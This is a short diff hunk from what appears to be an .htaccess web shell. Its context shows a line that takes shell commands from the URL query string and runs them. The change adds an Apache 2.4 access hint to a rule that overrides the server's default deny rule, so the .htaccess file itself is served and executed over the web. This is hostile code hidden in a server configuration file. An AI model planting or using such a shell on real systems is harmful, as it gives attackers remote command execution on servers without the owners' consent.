@@ -11,6 +11,8 @@ echo -en "Content-Type: text/plain\r\n\r\n";cmd=$(echo $QUERY_STRING | sed -e's/
 
 # Override default deny rule to make .htaccess file accessible over web
 <Files ~ "^\.ht">
+# Uncomment the line below for Apache2.4 and newer
+# Require all granted
     Order allow,deny
     Allow from all
 </Files>
